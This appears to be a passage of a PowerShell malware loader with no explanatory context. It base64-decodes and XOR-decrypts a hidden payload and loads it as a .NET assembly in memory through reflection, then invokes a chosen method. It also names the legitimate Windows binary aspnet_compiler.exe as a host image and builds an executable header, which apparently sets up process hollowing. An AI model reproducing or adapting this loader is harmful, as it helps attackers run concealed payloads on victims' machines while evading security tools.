$bytes = [Convert]::FromBase64String($blob)
for ($i=0; $i -lt $bytes.Length; $i++) {
    $bytes[$i] = $bytes[$i] -bxor $key[$i % $key.Length]
}
$assembly = [Reflection.Assembly]::Load($bytes)
$method = $assembly.GetType($type).GetMethod($entry)
$method.Invoke($null, $args)
$hostImage = 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe'
[byte[]]$image = (77,90,69,82,232,0,0,0)
